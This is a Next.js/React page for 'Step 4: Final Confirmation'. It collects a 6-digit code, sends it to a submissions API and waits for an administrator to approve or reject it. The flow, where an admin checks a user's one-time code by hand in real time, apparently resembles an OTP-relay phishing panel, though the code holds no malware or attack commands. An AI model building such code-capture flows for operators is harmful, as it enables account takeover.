
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { ArrowLeft, CheckCircle, Loader2, AlertCircle, ArrowRight } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { useToast } from '@/hooks/use-toast';
import { useEffect, useState, useCallback } from 'react';

import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '@/components/ui/form';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { Progress } from '@/components/ui/progress';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import type { Submission, AuthUser } from '@/lib/types';


const formSchema = z.object({
  finalCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

export default function FinalCodePage() {
    const router = useRouter();
    const { toast } = useToast();
    const [user, setUser] = useState<AuthUser | null>(null);
    const { formState, ...form } = useForm<FormValues>({
        resolver: zodResolver(formSchema),
        defaultValues: { finalCode: "" },
    });

    const [submission, setSubmission] = useState<Submission | null>(null);
    const [isPageLoading, setIsPageLoading] = useState(true);

    const [countdown, setCountdown] = useState(30);
    const [canResend, setCanResend] = useState(false);

    const isPending = submission?.finalCodeStatus === 'pending' && !!submission.finalCode;

    const fetchSubmission = useCallback(async (userId: string) => {
        try {
            const res = await fetch(`/api/submissions?id=${userId}`);
            if (res.status === 404) {
                toast({ variant: 'destructive', title: 'Error', description: 'Submission not found. Redirecting...' });
                sessionStorage.removeItem('user-session');
                router.replace('/start');
                return;
            }
            if (!res.ok) throw new Error('Failed to fetch submission data.');
            
            const data: Submission = await res.json();
            
            const sessionUser = sessionStorage.getItem('user-session');
            if(sessionUser) {
                const parsedUser: AuthUser = JSON.parse(sessionUser);
                const updatedUser = {...parsedUser, submission: data};
                sessionStorage.setItem('user-session', JSON.stringify(updatedUser));
                setUser(updatedUser);
            }

            setSubmission(data);
            
            if (data.phoneNumberStatus !== 'approved') {
                router.replace('/start/select-number');
                return;
            }
            if (data.finalCodeStatus === 'approved') {
                router.push('/success');
                return;
            }
             if (data.finalCode) {
                form.setValue('finalCode', data.finalCode);
            }
        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Error', description: err.message });
        } finally {
            setIsPageLoading(false);
        }
    }, [router, toast, form]);

    useEffect(() => {
        const sessionUser = sessionStorage.getItem('user-session');
        if (sessionUser) {
            const parsedUser: AuthUser = JSON.parse(sessionUser);
            setUser(parsedUser);
            fetchSubmission(parsedUser.id);
        } else {
             router.replace('/start');
        }
    }, [router, fetchSubmission]);
    
    useEffect(() => {
        if (isPending && user) {
            const interval = setInterval(() => fetchSubmission(user.id), 3000);
            return () => clearInterval(interval);
        }
    }, [isPending, user, fetchSubmission]);

    useEffect(() => {
        if (canResend || isPending) return;
        const timer = setInterval(() => {
            setCountdown(prev => {
                if (prev <= 1) {
                    setCanResend(true);
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);
        return () => clearInterval(timer);
    }, [canResend, isPending]);

    const handleResendCode = useCallback(() => {
        if (!user) return;
        setCanResend(false);
        setCountdown(30);
        toast({
            title: 'Code Resent',
            description: 'A new confirmation code has been sent (simulation).',
        });

        fetch('/api/submissions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                id: user.id,
                step: 'finalCode',
                data: '',
            }),
        }).then(res => res.json()).then(data => {
            setSubmission(data);
            form.reset({ finalCode: '' });
        });

    }, [toast, user, form]);
    
    const onSubmit = async (values: FormValues) => {
        if (!user) return toast({ variant: 'destructive', title: 'Error', description: 'You must be logged in.' });

        try {
             const response = await fetch('/api/submissions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: user.id,
                    step: 'finalCode',
                    data: values.finalCode,
                }),
            });
             if (!response.ok) {
                 const errorData = await response.json();
                 throw new Error(errorData.message || 'Failed to submit final code.');
            }
            const updatedSubmission = await response.json();
            setSubmission(updatedSubmission);
            toast({ title: 'Final Code Submitted', description: 'Please wait for final admin approval.' });
        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
        }
    };
    
    const { isSubmitting } = formState;
    const isRejected = submission?.finalCodeStatus === 'rejected';

    if (isPageLoading || !submission) {
        return <div className="flex justify-center items-center h-full"><Loader2 className="animate-spin h-8 w-8 text-primary" /></div>
    }

    return (
        <div className="w-full max-w-lg">
             <div className="text-center mb-8">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                    <CheckCircle className="h-8 w-8" />
                </div>
                <h1 className="text-2xl font-bold">Step 4: Final Confirmation</h1>
                <p className="text-muted-foreground">Enter the final 6-digit code to complete the process.</p>
            </div>

            <Progress value={100} className="w-[80%] mx-auto mb-8" />
            
             {isPending && (
                 <Alert className="mb-6 animate-pulse">
                    <Loader2 className="h-4 w-4 animate-spin mr-2" />
                    <AlertTitle>Final Approval Pending</AlertTitle>
                    <AlertDescription>An administrator is performing the final review of your application. This page will update automatically.</AlertDescription>
                </Alert>
            )}

             {isRejected && (
                 <Alert variant="destructive" className="mb-6">
                    <AlertCircle className="h-4 w-4" />
                    <AlertTitle>Code Rejected</AlertTitle>
                    <AlertDescription>
                        {submission?.rejectionReason || "The final code you entered was incorrect. Please try again."}
                         <Button variant="link" onClick={handleResendCode} className="p-0 h-auto ml-1" disabled={!canResend}>
                           {canResend ? 'Resend code.' : `Resend in ${countdown}s.`}
                        </Button>
                    </AlertDescription>
                </Alert>
            )}
            
            <Form {...form} formState={formState}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                    <FormField
                        control={form.control}
                        name="finalCode"
                        render={({ field }) => (
                            <FormItem>
                            <FormLabel className="sr-only">Final Code</FormLabel>
                            <FormControl>
                                <div className="flex justify-center">
                                <InputOTP 
                                    maxLength={6} 
                                    {...field} 
                                    disabled={isSubmitting || isPending}
                                >
                                    <InputOTPGroup>
                                        <InputOTPSlot index={0} />
                                        <InputOTPSlot index={1} />
                                        <InputOTPSlot index={2} />
                                        <InputOTPSlot index={3} />
                                        <InputOTPSlot index={4} />
                                        <InputOTPSlot index={5} />
                                    </InputOTPGroup>
                                </InputOTP>
                                </div>
                            </FormControl>
                            <FormMessage className="text-center" />
                            </FormItem>
                        )}
                    />

                    {!isPending && !isRejected && (
                        <div className="text-center text-sm text-muted-foreground">
                            {canResend ? (
                                <Button type="button" variant="link" onClick={handleResendCode} className="p-0 h-auto" disabled={isSubmitting}>
                                    Resend Code
                                </Button>
                            ) : (
                                <p>You can resend the code in {countdown}s</p>
                            )}
                        </div>
                    )}
                    
                    <div className="flex justify-between pt-4">
                         <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()} disabled={isSubmitting || isPending}>
                            <ArrowLeft className="mr-2 h-5 w-5" />
                            Back
                        </Button>
                         <Button type="submit" size="lg" className="rounded-full" disabled={isSubmitting || isPending}>
                            {(isSubmitting || isPending) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                             {isPending ? 'Verifying...' : 'Submit Application'}
                             {!isPending && <ArrowRight className="ml-2 h-5 w-5" />}
                        </Button>
                    </div>
                </form>
            </Form>
        </div>
    );
}
